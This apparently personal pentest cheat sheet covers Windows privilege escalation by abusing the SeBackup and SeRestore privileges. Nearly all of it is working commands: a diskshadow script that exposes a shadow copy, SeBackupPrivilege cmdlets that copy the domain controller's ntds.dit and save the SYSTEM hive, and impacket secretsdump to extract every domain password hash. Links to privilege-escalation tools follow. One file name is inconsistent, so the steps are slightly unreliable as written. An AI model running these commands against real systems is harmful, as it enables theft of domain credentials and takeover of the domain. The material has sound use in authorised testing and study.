## SeRestore and SeBackup

- Use robocopy to have access to everything (/b)

### Best option : ntds.dit and system :

**Pay attention, use a nc64.exe to use diskshadow or it will doesn't work**
- On windows machine : upload a file script.txt with : 
```
set context persistent nowriters
add volume c: alias dmwong
create
expose %dmwong% z:
```
- Then : `diskshadow -s script.txt`


- Upload dlls from https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug on windows machine

- Import it :
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
- Make the backup :
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit c:\temp\ndts.dit
reg save hklm\system c:\temp\system.bak
```

- If the `Copy-File...` command doesn't work, use robocopy instead :)

- Extract your file:  : ```python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system system.bak LOCAL```


## SeBackup : 

https://github.com/giuliano108/SeBackupPrivilege

https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1

## PayloadsAllTheThings

## Priv2Admin

https://github.com/gtworek/Priv2Admin

https://roberthosborne.com/privesc

## SeImpersonate and SeAssignPrimaryToken

RoguePotato / JuicyPotato ...